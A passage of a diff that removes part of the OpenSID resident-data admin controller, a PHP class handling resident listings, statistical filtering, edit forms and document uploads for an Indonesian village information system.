@@ -1,1881 +1,481 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-use App\Enums\AgamaEnum;
-use App\Enums\AktifEnum;
-use App\Enums\AsuransiEnum;
-use App\Enums\BahasaEnum;
-use App\Enums\CacatEnum;
-use App\Enums\CaraKBEnum;
-use App\Enums\GolonganDarahEnum;
-use App\Enums\HamilEnum;
-use App\Enums\JenisKelaminEnum;
-use App\Enums\PekerjaanEnum;
-use App\Enums\PendidikanKKEnum;
-use App\Enums\PendidikanSedangEnum;
-use App\Enums\PindahEnum;
-use App\Enums\SakitMenahunEnum;
-use App\Enums\SasaranEnum;
-use App\Enums\SHDKEnum;
-use App\Enums\StatusDasarEnum;
-use App\Enums\StatusEnum;
-use App\Enums\StatusKawinEnum;
-use App\Enums\StatusKawinSpesifikEnum;
-use App\Enums\StatusKTPEnum;
-use App\Enums\StatusPendudukEnum;
-use App\Enums\SukuEnum;
-use App\Enums\WargaNegaraEnum;
-use App\Libraries\Import;
-use App\Models\Bantuan;
-use App\Models\Dokumen;
-use App\Models\DokumenHidup;
-use App\Models\LogKeluarga;
-use App\Models\LogPenduduk;
-use App\Models\Penduduk as PendudukModel;
-use App\Models\PendudukMap;
-use App\Models\PendudukSaja;
-use App\Models\RentangUmur;
-use App\Models\StatusKtp;
-use App\Models\SyaratSurat;
-use App\Models\UserGrup;
-use App\Models\Wilayah;
-use Carbon\Carbon;
-use Illuminate\Support\Facades\DB;
-use OpenSpout\Common\Entity\Row;
-use OpenSpout\Writer\XLSX\Writer;
-
-defined('BASEPATH') || exit('No direct script access allowed');
-
-class Penduduk extends Admin_Controller
-{
-    public $modul_ini           = 'kependudukan';
-    public $sub_modul_ini       = 'penduduk';
-    public $kategori_pengaturan = 'Data Lengkap';
-    private $judulStatistik;
-    private $filterColumn    = [];
-    private $advanceSearch   = [];
-    private $statistikFilter = [];
-
-    public function __construct()
-    {
-        parent::__construct();
-        isCan('b');
-    }
-
-    public function index(): void
-    {
-        if ($this->input->get('status_dasar')) {
-            $this->filterColumn['status_dasar'] = $this->input->get('status_dasar');
-        }
-        if ($this->input->get('dusun')) {
-            $this->filterColumn['dusun'] = $this->input->get('dusun');
-        }
-        if ($this->input->get('rw')) {
-            $this->filterColumn['rw'] = $this->input->get('rw');
-        }
-        if ($this->input->get('rt')) {
-            $this->filterColumn['rt'] = $this->input->get('rt');
-        }
-        if ($this->input->get('sex')) {
-            $this->filterColumn['sex'] = $this->input->get('sex');
-        }
-        $data['disableFilter']        = in_array($this->uri->segment(2), ['statistik', 'lap_statistik']);
-        $data['wilayah']              = Wilayah::treeAccess();
-        $data['list_status_dasar']    = StatusDasarEnum::all();
-        $data['list_status_penduduk'] = StatusPendudukEnum::all();
-        $data['list_jenis_kelamin']   = JenisKelaminEnum::all();
-        $data['filterColumn']         = $this->filterColumn;
-        $data['defaultStatusDasar']   = $this->filterColumn['status_dasar'] ?? StatusDasarEnum::HIDUP;
-        $data['advanceSearch']        = $this->advanceSearch;
-        $data['statistikFilter']      = $this->statistikFilter;
-        $data['judul_statistik']      = $this->judulStatistik;
-        $data['pesan_hapus']          = 'Hanya lakukan hapus penduduk hanya jika ada kesalahan saat pengisian data atau penduduk tersebut tidak akan ditambahkan kembali. Apakah Anda yakin ingin menghapus data ini?';
-        $data['akses']                = UserGrup::getGrupId(UserGrup::ADMINISTRATOR);
-
-        view('admin.penduduk.index', $data);
-    }
-
-    public function datatables()
-    {
-        if ($this->input->is_ajax_request()) {
-            $canDelete = can('h');
-            $canUpdate = can('u');
-
-            return datatables()->of($this->sumberData())
-                ->addColumn('ceklist', static function ($row) use ($canDelete) {
-                    if ($canDelete) {
-                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
-                    }
-                })->addColumn('valid_kk', static function ($row) {
-                    $result = '';
-                    if (strlen($row->nik) < 16) {
-                        $result = 'warning';
-                    } elseif (get_nik($row->nik) == 0) {
-                        $result = 'danger';
-                    }
-
-                    return $result;
-                })
-                ->addColumn('foto', static fn ($row) => '<img class="penduduk_kecil" src="' . AmbilFoto($row->foto, '', $row->sex) . '" alt="Foto Penduduk" />')->addIndexColumn()
-                ->addColumn('aksi', static function ($row) use ($canUpdate, $canDelete): string {
-                    $aksi = '<div class="btn-group">
-                        <button type="button" class="btn btn-social btn-info btn-sm" data-toggle="dropdown"><i class="fa fa-arrow-circle-down"></i> Pilih Aksi</button>
-                        <ul class="dropdown-menu" role="menu">
-                            <li>
-                                <a href="' . ci_route('penduduk.detail', $row->id) . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-list-ol"></i> Lihat Detail Biodata Penduduk</a>
-                            </li>';
-                    if ($row->status_dasar == StatusDasarEnum::TIDAK_VALID && $canUpdate) {
-                        $aksi .= '<li>
-                                    <a href="#" data-href="' . ci_route('penduduk.kembalikan_status', $row->id) . '" class="btn btn-social btn-block btn-sm" data-remote="false" data-toggle="modal" data-target="#confirm-status" data-body="Apakah Anda yakin ingin mengembalikan status data penduduk ini?<br> Perubahan ini akan mempengaruhi laporan penduduk bulanan."><i class="fa fa-undo"></i> Kembalikan ke Status HIDUP</a>
-                                </li>';
-                    }
-                    if ($row->status_dasar == StatusDasarEnum::HIDUP) {
-                        if ($canUpdate) {
-                            $aksi .= '<li>
-                                        <a href="' . ci_route('penduduk.form', $row->id) . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-edit"></i> Ubah Biodata Penduduk</a>
-                                    </li>
-                                    <li>
-                                        <a href="' . ci_route('penduduk.ajax_penduduk_maps.' . $row->id, 0) . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-map-marker"></i> Lihat Lokasi Tempat Tinggal</a>
-                                    </li>';
-                            if (data_lengkap()) {
-                                $aksi .= '<li>
-                                            <a href="' . ci_route('penduduk.edit_status_dasar', $row->id) . '" data-remote="false" data-toggle="modal" data-target="#modalBox" data-title="Ubah Status Dasar" class="btn btn-social btn-block btn-sm"><i class="fa fa-sign-out"></i> Ubah Status Dasar</a>
-                                        </li>';
-                            }
-                        }
-                        $aksi .= '<li>
-                                            <a href="' . ci_route('penduduk.dokumen', $row->id) . '" class="btn btn-social btn-block btn-sm"><i class="fa fa-upload"></i> Upload Dokumen Penduduk</a>
-                                        </li>
-                                        <li>
-                                            <a href="' . ci_route('penduduk.cetak_biodata', $row->id) . '" target="_blank" class="btn btn-social btn-block btn-sm"><i class="fa fa-print"></i> Cetak Biodata Penduduk</a>
-                                        </li>';
-                        if ($canDelete && ! data_lengkap()) {
-                            $aksi .= '<li>
-                                        <a href="#" data-href="' . ci_route('penduduk.delete', $row->id) . '" class="btn btn-social btn-block btn-sm" data-toggle="modal" data-target="#confirm-delete"><i class="fa fa-trash-o"></i> Hapus</a>
-                                    </li>';
-                        }
-                    }
-                    $aksi .= '
-                        </ul>
-                    </div>';
-
-                    return $aksi;
-                })->editColumn('tgl_peristiwa', static fn ($q) => $q->log_latest ? tgl_indo($q->log_latest->tgl_peristiwa) : tgl_indo($q->created_at))
-                ->editColumn('created_at', static fn ($q) => tgl_indo($q->created_at))
-                ->editColumn('nama', static fn ($q) => strtoupper($q->nama))
-                ->addColumn('umur', static fn ($q) => $q->umur)
-                ->addColumn('status_perkawinan', static fn ($q) => $q->statusPerkawinan)
-                ->rawColumns(['aksi', 'ceklist', 'foto'])
-                ->make();
-        }
-
-        return show_404();
-    }
-
-    private function sumberData()
-    {
-        $statusDasar     = $this->input->get('status_dasar') ?? null;
-        $statusPenduduk  = $this->input->get('status_penduduk') ?? null;
-        $sex             = $this->input->get('jenis_kelamin') ?? null;
-        $dusun           = $this->input->get('dusun') ?? null;
-        $rw              = $this->input->get('rw') ?? null;
-        $rt              = $this->input->get('rt') ?? null;
-        $nikSementara    = $this->input->get('nik_sementara') ?? null;
-        $kumpulanNIK     = $this->input->get('kumpulan_nik') ?? null;
-        $bantuan         = $this->input->get('bantuan') ?? null;
-        $statistikFilter = $this->input->get('statistikfilter') ?? null;
-        $advanceSearch   = $this->input->get('advancesearch') ?? null;
-
-        $idCluster = $rt ? [$rt] : [];
-        if (! empty($kumpulanNIK)) {
-            $bantuan = $nikSementara = $rw = $dusun = $rt = $idCluster = $statusDasar = $statusPenduduk = $sex = $kelasSosial = null;
-        }
-
-        if ($bantuan) {
-            $kumpulanNIK = $nikSementara = $rw = $dusun = $rt = $idCluster = $statusDasar = $statusPenduduk = $sex = $kelasSosial = null;
-        }
-
-        if ($nikSementara) {
-            $bantuan = $kumpulanNIK = $rw = $dusun = $rt = $idCluster = $statusDasar = $statusPenduduk = $sex = $kelasSosial = null;
-        }
-
-        if ($statistikFilter) {
-            $advanceSearch = $bantuan = $kumpulanNIK = $rw = $dusun = $rt = $idCluster = $statusDasar = $statusPenduduk = $sex = $kelasSosial = null;
-            if (isset($statistikFilter['bantuan_penduduk'])) {
-                $bantuan = $statistikFilter['bantuan_penduduk'];
-                $sex     = $statistikFilter['sex'];
-                unset($statistikFilter);
-            }
-
-            $dusun     = $statistikFilter['dusun'] ?? null;
-            $rw        = $statistikFilter['rw'] ?? null;
-            $rt        = $statistikFilter['rt'] ?? null;
-            $clusterId = $statistikFilter['idCluster'] ?? null;
-
-            if ($rt) {
-                [$namaDusun, $namaRw] = explode('__', $rw);
-                $idCluster            = Wilayah::whereDusun($namaDusun)->whereRw($namaRw)->whereRt($rt)->select(['id'])->get()->pluck('id')->toArray();
-            }
-        }
-
-        if (empty($idCluster) && ! empty($rw)) {
-            [$namaDusun, $namaRw] = explode('__', $rw);
-            $idCluster            = Wilayah::whereDusun($namaDusun)->whereRw($namaRw)->select(['id'])->get()->pluck('id')->toArray();
-        }
-
-        if (empty($idCluster) && ! empty($dusun)) {
-            $idCluster = Wilayah::whereDusun($dusun)->select(['id'])->get()->pluck('id')->toArray();
-        }
-
-        if ($clusterId) $idCluster = $clusterId;
-
-        return PendudukModel::with(['log_latest'])
-            ->select('tweb_penduduk.*')
-            ->when($idCluster, static fn ($q) => $q->whereIn('tweb_penduduk.id_cluster', $idCluster))
-            ->when($statusDasar, static fn ($q) => $q->whereStatusDasar($statusDasar))
-            ->when($statusPenduduk, static fn ($q) => $q->whereStatus($statusPenduduk))
-            ->when($nikSementara, static fn ($q) => $q->where('nik', 'like', '0%'))
-            ->when($sex, static fn ($q) => $q->whereSex($sex))
-            ->when($kumpulanNIK, static fn ($q) => $q->whereIn('nik', $kumpulanNIK))
-            ->when($statistikFilter, static function ($q) use ($statistikFilter) {
-                if (isset($statistikFilter['umurx'])) {
-                    if ($statistikFilter['umurx'] == BELUM_MENGISI) {
-                        $statistikFilter['umur_min'] = -1;
-                        $statistikFilter['umur_max'] = -1;
-                    } else {
-                        $rentangUmur                 = RentangUmur::find($statistikFilter['umurx']);
-                        $statistikFilter['umur_min'] = $rentangUmur->dari;
-                        $statistikFilter['umur_max'] = $rentangUmur->sampai;
-                    }
-                }
-
-                $umurMin           = $statistikFilter['umur_min'];
-                $umurMax           = $statistikFilter['umur_max'];
-                $umurObj['satuan'] = 'tahun';
-                if (null !== $umurMin) {
-                    $umurObj['min'] = $umurMin;
-                }
-                if (null !== $umurMax) {
-                    $umurObj['max'] = $umurMax;
-                }
-
-                $map = [
-                    'pekerjaan_id'              => 'pekerjaan_id',
-                    'status_kawin'              => 'status_kawin',
-                    'agama'                     => 'agama_id',
-                    'pendidikan_sedang_id'      => 'pendidikan_sedang_id',
-                    'pendidikan_kk_id'          => 'pendidikan_kk_id',
-                    'status_penduduk'           => 'status',
-                    'sex'                       => 'sex',
-                    'status_dasar'              => 'status_dasar',
-                    'cara_kb_id'                => 'cara_kb_id',
-                    'status_ktp'                => 'ktp_el',
-                    'id_asuransi'               => 'id_asuransi',
-                    'warganegara'               => 'warganegara_id',
-                    'golongan_darah'            => 'golongan_darah_id',
-                    'menahun'                   => 'sakit_menahun_id',
-                    'cacat'                     => 'cacat_id',
-                    'suku'                      => 'suku',
-                    'hubungan'                  => 'kk_level',
-                    'akta_kelahiran'            => 'akta_lahir',
-                    'bpjs_ketenagakerjaan'      => 'bpjs_ketenagakerjaan',
-                    'status_asuransi_kesehatan' => 'status_asuransi',
-                    'hamil'                     => 'hamil',
-                    'buku-nikah'                => 'akta_perkawinan',
-                    'kia'                       => 'kia',
-                    'id_cluster'                => 'id_cluster',
-                ];
-
-                info($statistikFilter);
-
-                foreach ($statistikFilter as $key => $val) {
-                    if ($val != '') {
-                        if (isset($map[$key])) {
-                            if ($map[$key] == 'ktp_el') {
-                                $q->wajibKtp();
-                                if ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->whereNull('ktp_el')->orWhere('ktp_el', 0)->orWhere('status_rekam', 0)->orWhereNull('status_rekam'));
-                                } else {
-                                    if ($val == JUMLAH) {
-                                        $q->where(static fn ($r) => $r->whereNotNull('ktp_el')->whereNotIn('ktp_el', [0, 3]));
-                                    } else {
-                                        if ($val != TOTAL) {
-                                            $statusKTP = StatusKtp::find($val);
-                                            $q->where('ktp_el', '!=', 3)->where('status_rekam', $statusKTP->status_rekam);
-                                        }
-                                    }
-                                }
-                            } elseif ($map[$key] == 'kia') {
-                                $umurObj['min'] = 0;
-                                $umurObj['max'] = 17;
-                                if ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->whereNull('ktp_el')->orWhere('ktp_el', 0)->orWhere('status_rekam', 0)->orWhereNull('status_rekam'));
-                                } else {
-                                    if ($val == JUMLAH) {
-                                        $q->where('ktp_el', 3);
-                                    } else {
-                                        if ($val != TOTAL) {
-                                            $statusKTP = StatusKtp::find($val);
-                                            $q->where('ktp_el', 3)->where('status_rekam', $statusKTP->status_rekam);
-                                        }
-                                    }
-                                }
-                            } elseif ($map[$key] == 'akta_perkawinan') {
-                                $q->where('status_kawin', '!=', StatusKawinEnum::BELUMKAWIN);
-                                if ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->where('akta_perkawinan', '=', '')->orWhereNull('akta_perkawinan'));
-                                } elseif ($val == JUMLAH || $val == 2) {
-                                    $q->where(static fn ($r) => $r->where('akta_perkawinan', '!=', '')->whereNotNull('akta_perkawinan'));
-                                }
-                            } elseif ($map[$key] == 'cacat_id') {
-                                if ($val == CacatEnum::TIDAK_CACAT) {
-                                    $q->where(static fn ($r) => $r->where('cacat_id', '=', CacatEnum::TIDAK_CACAT)->orWhereNull('cacat_id'));
-                                } else {
-                                    if ($val == JUMLAH) {
-                                        $q->where(static fn ($r) => $r->where('cacat_id', '!=', CacatEnum::TIDAK_CACAT)->whereNotNull('cacat_id'));
-                                    } else {
-                                        $q->where($map[$key], $val);
-                                    }
-                                }
-                            } elseif ($map[$key] == 'sakit_menahun_id') {
-                                if (is_array($val)) {
-                                    $q->whereIn($map[$key], $val);
-                                } elseif ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->whereNull($map[$key])->orWhere($map[$key], ''));
-                                } else {
-                                    if ($val == JUMLAH) {
-                                        $q->whereNotNull($map[$key])->where($map[$key], '!=', '');
-                                    } else {
-                                        $q->where($map[$key], $val);
-                                    }
-                                }
-                            } elseif ($map[$key] == 'status_asuransi') {
-                                if ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->whereNull('status_asuransi'));
-                                } elseif ($val == JUMLAH || $val == 0) {
-                                    $q->where(static fn ($r) => $r->whereIn('status_asuransi', AktifEnum::keys()));
-                                } else {
-                                    $q->where('status_asuransi', $val);
-                                }
-                            } else {
-                                if ($val == BELUM_MENGISI) {
-                                    $q->where(static fn ($r) => $r->whereNull($map[$key])->orWhere($map[$key], ''));
-                                } else {
-                                    if ($val == JUMLAH) {
-                                        $q->whereNotNull($map[$key])->where($map[$key], '!=', '');
-                                    } else {
-                                        $q->where($map[$key], $val);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-
-                return $q->batasiUmur(date('d-m-Y'), $umurObj);
-            })
-            ->when($advanceSearch, static function ($q) use ($advanceSearch) {
-                $umurMin           = $advanceSearch['umur_min'];
-                $umurMax           = $advanceSearch['umur_max'];
-                $umurObj['satuan'] = $advanceSearch['umur'];
-                if ($umurMin !== null) {
-                    $umurObj['min'] = $umurMin;
-                }
-                if ($umurMax !== null) {
-                    $umurObj['max'] = $umurMax;
-                }
-
-                // maping field yang memiliki relasi dengan tabel lain
-                $map = [
-                    'pekerjaan_id'         => 'pekerjaan_id',
-                    'status'               => 'status',
-                    'agama'                => 'agama_id',
-                    'pendidikan_sedang_id' => 'pendidikan_sedang_id',
-                    'pendidikan_kk_id'     => 'pendidikan_kk_id',
-                    'status_penduduk'      => 'status',
-                    'sex'                  => 'sex',
-                    'status_dasar'         => 'status_dasar',
-                    'cara_kb_id'           => 'cara_kb_id',
-                    'status_ktp'           => 'status_rekam',
-                    'id_asuransi'          => 'id_asuransi',
-                    'warganegara'          => 'warganegara_id',
-                    'golongan_darah'       => 'golongan_darah_id',
-                    'menahun'              => 'sakit_menahun_id',
-                    'cacat'                => 'cacat_id',
-                ];
-                $resultMap = [];
-
-                foreach ($advanceSearch as $key => $val) {
-                    if ($val != '') {
-                        if (isset($map[$key])) {
-                            $resultMap[$map[$key]] = $val;
-                        }
-                    }
-                }
-
-                $statusKawin = $advanceSearch['status_kawin'];
-                if (in_array($statusKawin, StatusKawinSpesifikEnum::keys())) {
-                    if ($statusKawin == StatusKawinSpesifikEnum::KAWIN_TERCATAT) {
-                        $q->where('status_kawin', StatusKawinEnum::KAWIN)
-                            ->where('akta_perkawinan', '!=', '')
-                            ->whereNotNull('tanggalperkawinan');
-                    } elseif ($statusKawin == StatusKawinSpesifikEnum::KAWIN_BELUM_TERCATAT) {
-                        $q->where('status_kawin', StatusKawinEnum::KAWIN)
-                            ->where('akta_perkawinan', '')
-                            ->whereNull('tanggalperkawinan');
-                    } elseif ($statusKawin == StatusKawinSpesifikEnum::CERAIHIDUP_TERCATAT) {
-                        $q->where('status_kawin', StatusKawinEnum::CERAIHIDUP)
-                            ->where('akta_perceraian', '!=', '')
-                            ->whereNotNull('tanggalperceraian');
-                    } elseif ($statusKawin == StatusKawinSpesifikEnum::CERAIHIDUP_BELUM_TERCATAT) {
-                        $q->where('status_kawin', StatusKawinEnum::CERAIHIDUP)
-                            ->where('akta_perceraian', '')
-                            ->whereNull('tanggalperceraian');
-                    } else {
-                        $q->where('status_kawin', $statusKawin);
-                    }
-                }
-
-                if (in_array($advanceSearch['tag_id_card'], StatusEnum::keys())) {
-                    if ($advanceSearch['tag_id_card']) {
-                        $q->whereNotNull('tag_id_card');
-                    } else {
-                        $q->whereNull('tag_id_card');
-                    }
-                }
-
-                if (in_array($advanceSearch['id_kk'], StatusEnum::keys())) {
-                    if ($advanceSearch['id_kk']) {
-                        $q->whereNotNull('id_kk');
-                    } else {
-                        $q->whereNull('id_kk');
-                    }
-                }
-
-                return $q->batasiUmur(date('d-m-Y'), $umurObj)->where($resultMap);
-            })
-            ->when($bantuan, static function ($q) use ($bantuan) {
-                switch ($bantuan) {
-                    case BELUM_MENGISI:
-                        return $q->whereDoesntHave('bantuan');
-
-                    case JUMLAH:
-                        return $q->whereHas('bantuan');
-
-                    default:
-                        return $q->whereHas('bantuan', static fn ($r) => $r->where('program.id', $bantuan));
-                }
-            })
-            ->orderBy(DB::raw("CASE
-                WHEN CHAR_LENGTH(nik) < 16 THEN 1
-                WHEN nik LIKE '0%' AND CHAR_LENGTH(nik) = 16 THEN 2
-                ELSE 3
-            END"));
-    }
-    /*
-        Ajax url query data:
-        q -- kata pencarian
-        page -- nomor paginasi
-    */
-
-    public function list_nik_ajax()
-    {
-        if ($this->input->is_ajax_request()) {
-            $cari     = $this->input->get('q');
-            $penduduk = PendudukModel::select(['id', 'nik'])
-                ->when($cari, static function ($query) use ($cari): void {
-                    $query->where('nik', 'like', "%{$cari}%");
-                })
-                ->paginate(10);
-
-            return json([
-                'results' => collect($penduduk->items())
-                    ->map(static fn ($item): array => [
-                        'id'   => $item->nik,
-                        'text' => $item->nik,
-                    ]),
-                'pagination' => [
-                    'more' => $penduduk->currentPage() < $penduduk->lastPage(),
-                ],
-            ]);
-        }
-
-        return show_404();
-    }
-
-    public function ambil_foto(): void
-    {
-        $foto = $this->input->get('foto');
-        $sex  = $this->input->get('sex');
-        if (empty($foto) || ! file_exists(FCPATH . LOKASI_USER_PICT . $foto)) {
-            $foto = ($sex == 1) ? 'kuser.png' : 'wuser.png';
-            ambilBerkas($foto, $this->controller, null, 'assets/images/pengguna/', $tampil = true);
-        } else {
-            ambilBerkas($foto, $this->controller, null, LOKASI_USER_PICT, $tampil = true);
-        }
-    }
-
-    public function form_peristiwa($peristiwa = ''): void
-    {
-        isCan('u');
-        $this->form(null, $peristiwa);
-    }
-
-    public function form($id = null, $peristiwa = null): void
-    {
-        isCan('u');
-        $penduduk = new PendudukModel();
-        if ($id) {
-            $data['id'] = $id;
-            // Validasi dilakukan di penduduk_model sewaktu insert dan update
-            $penduduk                         = PendudukModel::with('log_latest')->findOrFail($id);
-            $data['penduduk']                 = $penduduk->toArray();
-            $data['penduduk']['no_kk']        = $penduduk->keluarga->no_kk;
-            $data['penduduk']['alamat']       = $penduduk->keluarga->alamat ?? $penduduk->alamat;
-            $data['penduduk']['tgl_lapor']    = $penduduk->log_latest->tgl_lapor;
-            $data['penduduk']['tanggallahir'] = $penduduk->tanggallahir?->format('d-m-Y');
-            $data['penduduk']['id_status']    = $penduduk->status;
-            $data['penduduk']['id_sex']       = $penduduk->sex;
-            $data['penduduk']['status_kawin'] = $penduduk->status_kawin;
-            $wilayah                          = $penduduk->wilayah;
-            $data['penduduk']['wilayah']      = ['dusun' => $wilayah->dusun, 'rw' => $wilayah->rw, 'rt' => $wilayah->rt];
-            $data['form_action']              = ci_route('penduduk.update', $id);
-            if ($penduduk->log_latest->kode_peristiwa == LogPenduduk::BARU_PINDAH_MASUK) {
-                $data['penduduk']['maksud_tujuan_kedatangan'] = $penduduk->log_latest->maksud_tujuan_kedatangan;
-            } else {
-                $data['penduduk']['maksud_tujuan_kedatangan'] = null;
-            }
-        } else {
-            // Validasi dilakukan di penduduk_model sewaktu insert
-            $data['penduduk']    = $penduduk->toArray();
-            $data['form_action'] = ci_route('penduduk.insert', $peristiwa);
-        }
-
-        $data['wilayah']            = Wilayah::treeAccess();
-        $data['agama']              = AgamaEnum::all();
-        $data['pendidikan_sedang']  = PendidikanSedangEnum::all();
-        $data['pendidikan_kk']      = PendidikanKKEnum::all();
-        $data['pekerjaan']          = PekerjaanEnum::all();
-        $data['warganegara']        = WargaNegaraEnum::all();
-        $data['hubungan']           = SHDKEnum::all();
-        $data['kawin']              = StatusKawinEnum::all();
-        $data['golongan_darah']     = GolonganDarahEnum::all();
-        $data['bahasa']             = BahasaEnum::all();
-        $data['cacat']              = CacatEnum::all();
-        $data['sakit_menahun']      = SakitMenahunEnum::all();
-        $data['cara_kb']            = CaraKBEnum::all();
-        $data['ktp_el']             = array_flip(unserialize(KTP_EL));
-        $data['status_rekam']       = StatusKTPEnum::all();
-        $data['tempat_dilahirkan']  = array_flip(unserialize(TEMPAT_DILAHIRKAN));
-        $data['jenis_kelahiran']    = array_flip(unserialize(JENIS_KELAHIRAN));
-        $data['penolong_kelahiran'] = array_flip(unserialize(PENOLONG_KELAHIRAN));
-        $data['pilihan_asuransi']   = AsuransiEnum::all();
-        $data['kehamilan']          = HamilEnum::all();
-        $data['suku']               = SukuEnum::all();
-        $data['suku_penduduk']      = PendudukModel::distinct()->select('suku')->whereNotNull('suku')->whereRaw('LENGTH(suku) > 0')->pluck('suku', 'suku');
-        $data['nik_sementara']      = PendudukModel::nikSementara();
-        $data['status_penduduk']    = StatusPendudukEnum::all();
-        $data['keluarga']           = $penduduk->keluarga;
-        $data['cek_nik']            = get_nik($penduduk->nik);
-
-        $data['jenis_peristiwa'] = $peristiwa;
-        $data['controller']      = 'penduduk';
-        $originalInput           = session('old_input');
-        if ($originalInput) {
-            $data['penduduk'] = $originalInput;
-            if (isset($originalInput['id_cluster'])) {
-                $wilayah                     = Wilayah::find((int) ($originalInput['id_cluster']));
-                $data['penduduk']['wilayah'] = ['dusun' => $wilayah->dusun, 'rw' => $wilayah->rw, 'rt' => $wilayah->rt];
-            }
-            $data['penduduk']['id_sex']    = $originalInput['sex'];
-            $data['penduduk']['id_status'] = $originalInput['status'];
-        }
-        $data['pesan_hapus']  = 'Apakah Anda yakin ingin mengembalikan foto menggunakan foto bawaan?';
-        $data['tombol_hapus'] = 'Kembalikan';
-        $data['icon_hapus']   = 'fa fa-undo';
-
-        view('admin.penduduk.form', $data);
-    }
-
-    public function detail($id): void
-    {
-        $penduduk             = PendudukModel::findOrFail($id);
-        $data['list_dokumen'] = $penduduk->dokumen;
-        $data['penduduk']     = $penduduk;
-        $data['program']      = $penduduk->pesertaBantuan;
-        view('admin.penduduk.detail', $data);
-    }
-
-    public function dokumen(int $id)
-    {
-        $data = ['penduduk' => PendudukModel::select('id', 'nik', 'nama', 'id_cluster')->find($id) ?? show_404()];
-
-        return view('admin.penduduk.dokumen.index', $data);
-    }
-
-    public function dokumen_datatables()
-    {
-        if ($this->input->is_ajax_request()) {
-            $idPend = $this->input->get('id_pend');
-
-            return datatables()->of(Dokumen::with(['jenisDokumen'])->whereIdPend($idPend))
-                ->addColumn('ceklist', static function ($row) {
-                    if (can('h')) {
-                        return '<input type="checkbox" name="id_cb[]" value="' . $row->id . '"/>';
-                    }
-                })
-                ->addIndexColumn()
-                ->addColumn('aksi', static function ($row) use ($idPend): string {
-                    $aksi = '';
-
-                    if (! $row->hidden) {
-                        if (can('u')) {
-                            $aksi .= '<a href="' . ci_route('penduduk.dokumen_form', "{$idPend}/{$row->id}") . '" class="btn bg-orange btn-sm" data-remote="false" data-toggle="modal" data-target="#modalBox" data-title="Ubah Data" title="Ubah Data" title="Ubah Data"><i class="fa fa-edit"></i></a> ';
-                        }
-                        if (can('u')) {
-                            $aksi .= '<a href="#" data-href="' . ci_route('penduduk.delete_dokumen', "{$idPend}/{$row->id}") . '" class="btn bg-maroon btn-sm" title="Hapus Data" data-toggle="modal" data-target="#confirm-delete"><i class="fa fa-trash-o"></i></a> ';
-                        }
-                    }
-
-                    return $aksi . ('<a href="' . ci_route('penduduk.unduh_berkas', $row->id) . '" class="btn bg-purple btn-sm" title="Unduh Dokumen"><i class="fa fa-download"></i></a>');
-                })
-                ->editColumn('jenis_dokumen', static fn ($row) => $row->jenisDokumen->ref_syarat_nama ?? '')
-                ->editColumn('tgl_upload', static fn ($row) => tgl_indo2($row->tgl_upload))
-                ->rawColumns(['aksi', 'ceklist'])
-                ->make();
-        }
-
-        return show_404();
-    }
-
-    public function dokumen_form(int $id, $id_dokumen = 0)
-    {
-        isCan('u');
-        $penduduk                   = PendudukModel::with(['keluarga', 'dokumen' => static fn ($q) => $q->whereId($id_dokumen)])->find($id) ?? show_404();
-        $data['penduduk']           = ['id' => $id, 'nik' => $penduduk->nik];
-        $data['jenis_syarat_surat'] = SyaratSurat::get();
-
-        if ($penduduk->isKepalaKeluarga()) { //Jika Kepala Keluarga
-            $data['kk'] = $penduduk->keluarga->anggota->keyBy('id')->toArray();
-        }
-
-        if ($id_dokumen) {
-            $dokumenTerpilih = $penduduk->dokumen->first();
-            $data['dokumen'] = $dokumenTerpilih->toArray();
-
-            // Ambil data anggota KK
-            if ($penduduk->isKepalaKeluarga()) { //Jika Kepala Keluarga
-                $dokumenAnggota = $dokumenTerpilih->children;
-
-                if ($dokumenAnggota) {
-                    $data['dokumen_anggota'] = $dokumenAnggota->toArray();
-
-                    foreach ($dokumenAnggota as $item) {
-                        $data['kk'][$item->id_pend]['checked'] = 'checked';
-                    }
-                }
-            }
-
-            $data['form_action'] = ci_route("{$this->controller}/dokumen_update/{$id_dokumen}");
-        } else {
-            $data['dokumen']     = null;
-            $data['form_action'] = ci_route("{$this->controller}/dokumen_insert");
-        }
-
-        return view('admin.penduduk.dokumen.form', $data);
-    }
-
-    public function dokumen_list($id = 0): void
-    {
